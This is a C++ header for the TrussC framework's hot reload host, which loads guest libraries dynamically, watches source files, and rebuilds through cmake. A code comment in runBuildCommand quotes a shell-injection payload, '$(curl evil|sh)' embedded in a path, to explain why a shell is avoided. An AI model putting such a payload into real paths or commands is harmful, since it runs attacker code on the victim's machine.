#pragma once

// =============================================================================
// tcHotReloadHost.h — Hot reload host runtime
// =============================================================================
// This header is included only by the Host executable (when TC_HOT_RELOAD_BUILD
// is defined). It implements:
//   - Guest shared library loading via dlopen/dlsym
//   - Polling-based file watcher on src/
//   - Automatic Guest rebuild via cmake
//   - Live swap of the App instance without restarting the event loop
// =============================================================================

#ifdef TC_HOT_RELOAD_BUILD

// The host gets its configuration from CMake. Guest translation units also
// include this header, but do not run the host runtime.
#ifndef TC_HOT_RELOAD_CONFIG
#define TC_HOT_RELOAD_CONFIG ""
#endif
#ifndef TC_HOT_RELOAD_CORE_LIB
#define TC_HOT_RELOAD_CORE_LIB ""
#endif
#ifndef TC_HOT_RELOAD_BUILD_DIR
#define TC_HOT_RELOAD_BUILD_DIR ""
#endif
#ifndef TC_HOT_RELOAD_MULTI_CONFIG
#define TC_HOT_RELOAD_MULTI_CONFIG 0
#endif

// Note: this header is included BY TrussC.h (after all core types are defined).
#ifdef _WIN32
#include <windows.h>
#include <process.h>
#else
#include <dlfcn.h>
#include <spawn.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <cstring>
extern char** environ;
#endif
#include <filesystem>
#include <fstream>
#include <chrono>
#include <string>
#include <vector>
#include <cstdlib>
#include "internal/tcHotReloadDiagnostics.h"
#include "internal/tcWindowsBuildOutput.h"
#include "internal/tcHotReloadScan.h"
#include "internal/tcPosixBuildOutput.h"

namespace trussc {
namespace hot_reload {

namespace fs = std::filesystem;
using std::string;
using std::vector;
using std::ifstream;
using Clock = std::chrono::steady_clock;

// Function pointer types for Guest exports
using CreateAppFn  = App* (*)();
using DestroyAppFn = void (*)(App*);

// ---------------------------------------------------------------------------
// Guest library manager
// ---------------------------------------------------------------------------

struct GuestLibrary {
#ifdef _WIN32
    HMODULE handle = nullptr;
#else
    void* handle = nullptr;
#endif
    std::shared_ptr<void> code;
    const void* codeOwner = nullptr;
    CreateAppFn createApp = nullptr;
    DestroyAppFn destroyApp = nullptr;
    std::weak_ptr<App> app; // Window owns the App; the guest keeps only generation metadata.
    string loadedPath;  // actual path loaded (may be a temp copy on Windows)
    const void* mcpOwner = nullptr;  // this generation's MCP registrations (create/destroy)

    static void closeLibrary(void* library) {
#ifdef _WIN32
        FreeLibrary(static_cast<HMODULE>(library));
#else
        dlclose(library);
#endif
    }
    bool load(const string& path) {
        // Always load from a unique temp path. Without this, the OS dynamic
        // loader deduplicates by pathname/inode and may return the already-
        // loaded handle on subsequent dlopen() calls:
        //   - Windows:  can't overwrite a loaded DLL at all.
        //   - Linux:    glibc caches loaded objects; if C++ statics/typeinfo
        //               keep the refcount above 0, dlclose() doesn't actually
        //               unload, so a later dlopen(samepath) silently hands
        //               back the OLD code.
        //   - macOS:    dyld usually picks up the replacement, but copying to
        //               a unique path makes behavior identical across OSes.
        static int loadCounter = 0;  // host-only: only the host loads guests
#ifdef _WIN32
        const char* ext = ".tmp.dll";
#else
        const char* ext = ".tmp.so";
#endif
        string tempPath = path + "." + std::to_string(loadCounter++) + ext;
        try { fs::copy_file(path, tempPath, fs::copy_options::overwrite_existing); }
        catch (...) { logError("HotReload") << "Failed to copy library to " << tempPath; return false; }

#ifdef _WIN32
        handle = LoadLibraryA(tempPath.c_str());
        if (!handle) {
            logError("HotReload") << "LoadLibrary failed (error " << GetLastError() << ")";
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
        createApp = (CreateAppFn)GetProcAddress(handle, "tcHotReloadCreateApp");
        destroyApp = (DestroyAppFn)GetProcAddress(handle, "tcHotReloadDestroyApp");
        if (!createApp || !destroyApp) {
            logError("HotReload") << "GetProcAddress failed";
            FreeLibrary(handle);
            handle = nullptr;
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
#else
        handle = dlopen(tempPath.c_str(), RTLD_NOW | RTLD_LOCAL);
        if (!handle) {
            logError("HotReload") << "dlopen failed: " << dlerror();
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
        createApp = (CreateAppFn)dlsym(handle, "tcHotReloadCreateApp");
        destroyApp = (DestroyAppFn)dlsym(handle, "tcHotReloadDestroyApp");
        if (!createApp || !destroyApp) {
            logError("HotReload") << "dlsym failed: " << dlerror();
            dlclose(handle);
            handle = nullptr;
            try { fs::remove(tempPath); } catch (...) {}
            return false;
        }
#endif
        internal::refreshCrashModules();
        loadedPath = tempPath;
        try {
            codeOwner = internal::nextAppGeneration();
            internal::registerGuestCode(codeOwner, handle, closeLibrary, reinterpret_cast<const void*>(createApp));
            code = internal::retainGuestCodeFor(reinterpret_cast<const void*>(createApp));
        } catch (...) {
            closeLibrary(handle); handle = nullptr; codeOwner = nullptr;
            try { fs::remove(loadedPath); } catch (...) {}
            throw;
        }
        return true;
    }

    std::weak_ptr<Window> targetWindow;
    bool targetAssigned = false;
    App* create() {
        if (createApp) {
            if (!targetAssigned) {
                auto* context = internal::currentWindowCtx();
                auto* selected = context && context->hostWindow ? context->hostWindow : internal::resolveWindow();
                if (selected) targetWindow = internal::WindowRequestAccess::retainHostOwner(*selected);
                targetAssigned = true;
            }
            auto target = targetWindow.lock();
            if (!target || !target->isOpen()) return nullptr;
            App* raw = nullptr;
            mcpOwner = internal::nextAppGeneration();

            internal::AppConstructionTicket ticket;
            ticket.registrationOwner = mcpOwner;
            ticket.code = code;
            ticket.context = &target->context();
            {
                internal::AppConstructionScope construction(ticket);
                raw = createApp();
                if (raw) internal::completeAppConstruction(*raw);
            }
            if (!raw) return nullptr;
            auto candidate = internal::adoptConstructedApp(raw, destroyApp);
            if (target && target->isOpen()) internal::attachCandidate(*target, candidate);
            if (!target || target->getApp() != candidate) {
                // Constructor registrations must not outlive a refused candidate.
                internal::retireAppOwner(ticket.owner);
                return nullptr;
            }
            app = candidate;
            return raw;
        }
        return nullptr;
    }

    void destroy() {
        internal::retireAppGeneration(mcpOwner);
        mcpOwner = nullptr;
        if (auto live = app.lock()) {
            if (auto* window = live->getWindow()) {
                window->destroyApp();
                internal::WindowRequestAccess::applyPendingApp(*window);
            } else internal::retireAppOwner(internal::appOwner(*live));
        }
        app.reset();
    }

    void unload() {
        // Notification failures cannot skip cohort ending or code retirement.
        internal::TeardownSteps steps;
        if (handle || !app.expired()) {
            if (auto window = targetWindow.lock()) steps.run("guest unload notification", [&] {
                internal::WindowContextScope selected(&window->context());
                window->events().hotReloadUnload.notify();
            });
        }
        destroy();
        // Retirement cancels callbacks now. Retained snapshots and App handles
        // pin the library until their guest destructors have returned; the host
        // maintenance boundary then physically unloads it without allocating.
        if (handle) {
            handle = nullptr;
#ifndef _WIN32
            // POSIX: unlinking the mapped temp copy is safe (drops the
            // directory entry only). Windows can't delete a loaded DLL, so
            // temp copies remain until the next run cleans them up.
            try { fs::remove(loadedPath); } catch (...) {}
#endif
        }
        createApp = nullptr;
        destroyApp = nullptr;
        internal::releaseGuestCode(codeOwner);
        codeOwner = nullptr;
        code.reset();
        internal::drainGuestCode();
    }
};

// ---------------------------------------------------------------------------
// File watcher (polling-based, checks mtime of src/ files)
// ---------------------------------------------------------------------------

struct FileWatcher {
    vector<fs::path> watchPaths;
    fs::file_time_type lastBuildTime;
    internal::HotReloadScanLoss scanLoss;

    void init(const string& srcDir) {
        // Release old path storage before constructing the bounded replacement.
        vector<fs::path>().swap(watchPaths);
        watchPaths = internal::hotReloadSources(srcDir, scanLoss);
        lastBuildTime = fs::file_time_type::clock::now();
    }

    bool hasChanges() {
        for (const auto& p : watchPaths) {
            try {
                if (fs::last_write_time(p) > lastBuildTime) return true;
            } catch (...) {}
        }
        return false;
    }

    void markBuilt() {
        lastBuildTime = fs::file_time_type::clock::now();
    }

    // Re-scan in case new files were added
    void rescan(const string& srcDir) {
        auto saved = lastBuildTime;
        init(srcDir);
        lastBuildTime = saved;
    }
};

// ---------------------------------------------------------------------------
// Find cmake binary (same logic as trusscli)
// ---------------------------------------------------------------------------

inline string findCMake(const string& buildDir = "") {
    // Prefer the cmake that originally configured this build directory.
    // On Windows, PATH may resolve to an older VS cmake that doesn't
    // know the generator used by the current build (e.g. "Visual Studio 18 2026").
    if (!buildDir.empty()) {
        fs::path cachePath = fs::path(buildDir) / "CMakeCache.txt";
        auto& loss = internal::hotReloadCacheLoss();
        const auto path = internal::hotReloadCMakeCommand(cachePath, loss);
        try {
            std::error_code error;
            if (!path.empty() && fs::is_regular_file(path, error)) return path;
        } catch (const fs::filesystem_error&) {
            ++loss.rejectedCaches;
            loss.warn();
        } catch (const std::bad_alloc&) {
            ++loss.rejectedCaches;
            loss.warn();
        }
    }
#ifdef __APPLE__
    const char* paths[] = {
        "/opt/homebrew/bin/cmake",
        "/usr/local/bin/cmake",
        "/Applications/CMake.app/Contents/bin/cmake",
    };
    for (const char* p : paths) {
        if (fs::exists(p)) return p;
    }
#endif
    return "cmake";
}

// ---------------------------------------------------------------------------
// Spawn a process with explicit argv (no shell). Equivalent in spirit to
// trusscli's runProcess(). We bypass std::system because the build dir is
// derived from fs::canonical(getExecutablePath()) — outside the developer's
// direct control once the binary is built and distributed — and may contain
// shell metacharacters that would be expanded by /bin/sh -c "...".
// Specifically, $(cmd) and `cmd` are evaluated even inside double quotes,
// so a path like ~/projects/demo$(curl evil|sh)/ would execute the embedded
// command on every rebuild. Passing argv directly to posix_spawnp /
// _spawnvp removes the shell from the loop entirely; any metacharacters
// become literal argument bytes to cmake.
// ---------------------------------------------------------------------------
inline int runBuildCommand(const vector<string>& argv, string& output) {
    output.clear();
    if (argv.empty()) return -1;

#ifdef _WIN32
    // Build a quoted command line for CreateProcess.
    // _spawnvp can mangle argv when the executable path contains spaces.
    string cmdLine;
    for (size_t i = 0; i < argv.size(); i++) {
        if (i > 0) cmdLine += ' ';
        bool needsQuote = argv[i].find(' ') != string::npos;
        if (needsQuote) cmdLine += '"';
        cmdLine += argv[i];
        if (needsQuote) cmdLine += '"';
    }
    const int rc = internal::runWindowsBuildWithOutput(cmdLine, output);
    if (rc == -1) {
        logError("HotReload") << "Failed to launch: " << argv[0];
    }
    return rc;
#else
    return internal::runPosixBuildWithOutput(argv, output);
#endif
}

// ---------------------------------------------------------------------------
// Hot reload host — manages the Guest lifecycle
// ---------------------------------------------------------------------------

struct Host {
    GuestLibrary guest;
    FileWatcher watcher;
    string projectDir;   // project root (where CMakeLists.txt is)
    string buildDir;     // cmake build directory
    string guestLibPath; // path to the built guest library
    string srcDir;       // src/ directory to watch
    Clock::time_point lastCheck;
    int reloadCount = 0;
    bool initialized = false;
    bool multiConfig = false;
    string coreLibPath = TC_HOT_RELOAD_CORE_LIB;
    string configuredBuildDir = TC_HOT_RELOAD_BUILD_DIR; // relative to projectDir
    vector<string> buildDirsTried;
    bool rebuildBlocked = false; // preflight already logged the reason

    bool reportMissingBuildDirectory() {
        string tried;
        for (const auto& dir : buildDirsTried) {
            if (!tried.empty()) tried += ", ";
            tried += dir;
        }
        if (tried.empty()) tried = buildDir;
        logError("HotReload") << "No build directory with CMakeCache.txt for project "
                              << projectDir << "; tried: " << tried;
        rebuildBlocked = true;
        return false;
    }

    // Single-config (Ninja/Make): directly under buildDir.
    // Multi-config (Xcode/VS/Ninja Multi-Config): the host's configuration.
    void updateGuestLibPath() {
#ifdef __APPLE__
        const string guestName = "libguest.dylib";
#elif defined(_WIN32)
        const string guestName = "guest.dll";
#else
        const string guestName = "libguest.so";
#endif
        // The generator type is a configure-time fact (no directory has to
        // exist before the first guest build).
        multiConfig = TC_HOT_RELOAD_MULTI_CONFIG != 0 && string(TC_HOT_RELOAD_CONFIG) != "";
        guestLibPath = buildDir + "/";
        if (multiConfig) guestLibPath += string(TC_HOT_RELOAD_CONFIG) + "/";
        guestLibPath += guestName;
    }

    // The one place that decides where the build directory is: at init, and
    // again when its CMakeCache.txt has gone by the time of a rebuild.
    bool findBuildDirectory() { return findBuildDirectory(configuredBuildDir); }

    bool findBuildDirectory(const string& configuredDir) {
#ifdef __APPLE__
        const char* presetDirs[] = {"build-macos", "xcode", "build"};
#elif defined(_WIN32)
        const char* presetDirs[] = {"build-windows", "vs", "build"};
#else
        const char* presetDirs[] = {"build-linux", "build"};
#endif
        buildDir.clear();
        buildDirsTried.clear();
        rebuildBlocked = false;
        vector<string> candidates;
        if (!configuredDir.empty()) {
            candidates.push_back((fs::path(projectDir) / configuredDir).lexically_normal().string());
        }
        for (const char* dir : presetDirs) {
            candidates.push_back((fs::path(projectDir) / dir).lexically_normal().string());
        }
        for (const auto& candidate : candidates) {
            buildDirsTried.push_back(candidate);
            std::error_code ec;
            if (fs::is_regular_file(fs::path(candidate) / "CMakeCache.txt", ec)) {
                buildDir = candidate;
                updateGuestLibPath();
                return true;
            }
        }
        return reportMissingBuildDirectory();
    }

    bool init() {
        // Detect project directory from the executable's location
        // The Host EXE is at bin/<AppName>.app/Contents/MacOS/<AppName> (macOS)
        // or bin/<AppName> (Linux)
        fs::path exePath = fs::canonical(getExecutablePath());
        fs::path searchPath = exePath.parent_path();

        #ifdef __APPLE__
        // Climb out of MacOS → Contents → .app → bin → project root
        for (int i = 0; i < 4 && searchPath.has_parent_path(); ++i) {
            searchPath = searchPath.parent_path();
        }
        #else
        // bin → project root
        searchPath = searchPath.parent_path();
        #endif

        projectDir = searchPath.string();
        srcDir = projectDir + "/src";

        // Prefer the configured tree; retain the old names for older builds.
        if (!findBuildDirectory()) return false;

        if (!fs::exists(srcDir)) {
            logError("HotReload") << "src/ directory not found at " << srcDir;
            return false;
        }

        // Initial build of the Guest
        if (!rebuildGuest()) {
            if (!rebuildBlocked) logError("HotReload") << "Initial Guest build failed";
            return false;
        }

        // Load the Guest and create the initial App instance
        if (!guest.load(guestLibPath)) {
            logError("HotReload") << "Failed to load Guest library";
            return false;
        }
        if (!guest.create()) {
            logError("HotReload") << "Failed to create initial App instance";
            return false;
        }

        // Start watching
        watcher.init(srcDir);
        lastCheck = Clock::now();
        initialized = true;

        logNotice("HotReload") << "Ready. Watching " << srcDir
                               << " (" << watcher.watchPaths.size() << " files)";
        return true;
    }

    bool rebuildGuest() {
        rebuildBlocked = false;
        // Missing/unreadable paths cannot establish staleness; keep rebuilding.
        std::error_code ec;
        const auto coreTime = fs::last_write_time(coreLibPath, ec);
        if (!ec) {
            const auto hostTime = fs::last_write_time(getExecutablePath(), ec);
            if (!ec && coreTime > hostTime) {
                logError("HotReload") << "the host executable is older than TrussC; rebuild and restart the app";
                rebuildBlocked = true;
                return false;
            }
        }
        if (!fs::is_regular_file(fs::path(buildDir) / "CMakeCache.txt", ec) &&
            !findBuildDirectory()) {
            return false;
        }
        string cmake = findCMake(buildDir);
        logNotice("HotReload") << "Rebuilding guest...";

        // Only rebuild the guest target — fast incremental build.
        // argv is passed directly to posix_spawnp / _spawnvp — no shell
        // is involved, so $(...), ``, ; etc. in buildDir cannot run.
        vector<string> command = {cmake, "--build", buildDir,
                                  "--target", "guest", "--parallel"};
        if (multiConfig) command.insert(command.end(), {"--config", TC_HOT_RELOAD_CONFIG});
        string output;
        int rc = runBuildCommand(command, output);
        if (rc != 0) {
            logError() << "[HotReload] Build failed (exit code " << rc << ")";
#ifdef _WIN32
            if (internal::hasWindowsGuestLinkError(output)) {
                logWarning() << internal::windowsGuestLinkHint();
            }
#endif
            return false;
        }
        return true;
    }

    bool reloadRequested = false;
    bool reload() {
        if (internal::hostCallbacksActive()) {
            reloadRequested = true;
            return true; // accepted; the next host boundary performs the reload
        }
        return reloadNow();
    }

    bool reloadNow() {
        // IMPORTANT: rebuild BEFORE unloading the old Guest. On macOS/Linux,
        // overwriting a loaded dylib is safe (the old inode stays in memory).
        // If the build fails, the old App keeps running undisturbed.

        auto tStart = Clock::now();
        if (!rebuildGuest()) {
            logWarning() << "[HotReload] Build failed — keeping current version";
            watcher.markBuilt();  // don't re-trigger on the same mtime
            return false;
        }
        auto tBuildDone = Clock::now();

        // Build succeeded — now swap: destroy old App, unload old library,
        // load the new one.
        guest.unload();

        if (!guest.load(guestLibPath)) {
            logError() << "[HotReload] Failed to load rebuilt library";
            return false;
        }

        App* newApp = guest.create();
        if (!newApp) {
            logError() << "[HotReload] Failed to create App instance";
            return false;
        }


        reloadCount++;
        watcher.markBuilt();
        watcher.rescan(srcDir);

        // Report build vs swap split — useful for diagnosing where time goes
        // (e.g. when iterating on PCH or linker flags).
        using ms = std::chrono::milliseconds;
        auto tEnd = Clock::now();
        long buildMs = std::chrono::duration_cast<ms>(tBuildDone - tStart).count();
        long swapMs  = std::chrono::duration_cast<ms>(tEnd - tBuildDone).count();
        long totalMs = std::chrono::duration_cast<ms>(tEnd - tStart).count();
        logNotice("HotReload") << "Reloaded (#" << reloadCount << ") — "
                               << totalMs << " ms total (build " << buildMs
                               << " ms + swap " << swapMs << " ms)";
        return true;
    }

    // Called from the update loop — checks for file changes periodically
    void poll() {
        if (!initialized) return;
        if (reloadRequested) {
            reloadRequested = false;
            reloadNow();
            return;
        }

        auto now = Clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastCheck);
        if (elapsed.count() < 500) return;  // Check every 500ms
        lastCheck = now;

        if (watcher.hasChanges()) {
            reload();
        }
    }

    App* getApp() { return guest.app.lock().get(); }
};

// ---------------------------------------------------------------------------
// Global host instance. Host-only: only the host's runHotReloadApp uses it; a
// guest's copy (TrussC.h includes this header there too) is never used.
// ---------------------------------------------------------------------------
inline Host g_host;

} // namespace hot_reload

// ---------------------------------------------------------------------------
// runHotReloadApp — entry point for hot reload mode
// ---------------------------------------------------------------------------

namespace internal {

inline int runHotReloadApp(const WindowSettings& settings) {
    using namespace hot_reload;
    internal::beginRuntimeRun();

    // Initialize the host (builds and loads Guest for the first time)
    // This must happen AFTER sokol is initialized, but we need the App*
    // before sapp_run. So we defer Guest loading to the setup callback.

    // Set up callbacks that go through the Host's dynamically loaded App
    internal::appSetupFunc = []() {
        if (!g_host.init()) {
            if (!g_host.rebuildBlocked) logError() << "[HotReload] Host initialization failed. Exiting.";
            sapp_quit();
            return;
        }
        // The Guest's App has been created by g_host.init() → guest.create().
        // TrussC's internal setup (screen size etc.) is already done by _setup_cb.
    };

    internal::appCleanupFunc = []() {
        // Retain the generation through hotReloadUnload, as on the old runner.
        auto app = g_host.guest.app.lock();
        internal::shutdownRuntime();
        g_host.guest.unload();
    };
    auto window = internal::prepareLaunchWindow(settings);
    g_host.guest.targetWindow = window;
    g_host.guest.targetAssigned = true;

    // Build the sokol descriptor (without template — we handle App* manually)
    internal::pixelPerfectMode() = settings.pixelPerfect;

    sapp_desc desc = buildWindowDescriptor(settings, window.get());
    setHostReloadPoll([] { g_host.poll(); });
    openEnvLogFile();   // TRUSSC_LOG_FILE before sapp_run(): init-time failures too
#ifdef _WIN32
    ConsoleCPCtrlGuard consoleCtrl;   // restore both console code pages on exit
#endif
    appExitCode() = 0;
    appSetupCalled() = false;
    sapp_run(&desc);
    shutdownRuntime();
    endFrameworkLifetime();
    setHostReloadPoll(nullptr);
    return appSetupCalled() ? appExitCode() : 1;
}

} // namespace internal

} // namespace trussc

#endif // TC_HOT_RELOAD_BUILD
